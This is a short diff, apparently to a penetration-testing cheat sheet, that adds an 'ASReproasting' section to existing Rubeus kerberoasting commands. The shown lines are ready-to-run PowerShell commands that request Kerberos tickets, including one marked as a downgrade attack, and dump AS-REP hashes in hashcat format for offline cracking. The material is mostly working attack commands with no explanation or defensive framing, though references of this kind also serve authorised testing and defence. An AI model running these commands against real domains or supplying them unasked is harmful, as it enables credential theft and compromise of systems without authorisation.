@@ -44,4 +44,10 @@ PS> .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
 PS> .\Rubeus.exe kerberoast /user:cn /nowrap # cn encryption settings
 PS> .\Rubeus.exe kerberoast /tgtdeleg /ldapfilter:'admincount=1' /nowrap # try a downgrade attack
 ```
+
+ASReproasting
+
+```shell!
+PS> .\Rubeus.exe asreproast /user:cn /nowrap /format:hashcat
+```
 </div></div>
